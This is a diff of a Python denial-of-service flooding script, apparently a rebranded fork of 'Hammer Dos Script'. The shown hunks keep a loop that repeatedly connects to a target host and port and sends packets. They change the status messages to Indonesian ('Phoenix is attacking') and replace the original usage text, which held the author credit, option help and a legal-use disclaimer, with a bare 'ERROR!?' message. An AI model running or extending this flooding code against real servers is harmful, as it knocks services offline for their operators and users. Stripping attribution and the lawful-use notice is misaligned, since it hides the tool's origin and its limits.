@@ -49,13 +49,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Phoenix Sedang Menyerang--> \033[0m")
 			else:
 				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
+				print("\033[91mPhoenix Sedang Beristirahat\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
+		print("\033[91mTidak ada koneksi! Mungkin Server Down\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -75,14 +75,7 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	print (''' \033[92m ERROR!?  \033[0m''')
 	sys.exit()
 
 
